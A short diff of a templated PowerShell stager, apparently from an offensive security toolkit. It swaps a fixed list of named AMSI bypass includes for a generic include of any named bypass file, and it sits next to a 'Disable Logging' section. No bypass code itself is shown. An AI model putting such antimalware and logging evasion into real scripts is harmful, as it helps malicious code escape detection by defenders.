@@ -32,18 +32,8 @@ function {{symbol_name("Decrypt-String")}} {
 
 
 if ($PSVersionTable.PSVersion.Major -ge 5) {
-    {% if amsibypass == 'am0nsec' %}
-        {% include "powershell/am0nsec-amsi-bypass.ps1" %}
-    {% elif amsibypass == 'reflection' %}
-        {% include "powershell/reflection.ps1" %}
-    {% elif amsibypass == 'reflection2' %}
-        {% include "powershell/amsi-reflection2.ps1" %}
-    {% elif amsibypass == 'rasta-mouse' %}
-        {% include "powershell/amsi-rasta-mouse.ps1" %}
-    {% elif amsibypass == 'adam-chester' %}
-        {% include "powershell/amsi-adam-chester.ps1" %}
-    {% elif amsibypass == 'zc00l' %}
-        {% include "powershell/amsi-zc00l.ps1" %}
+    {% if amsibypass %}
+        {% include amsibypass %}
     {% endif %}
 
     {# Disable Logging #}
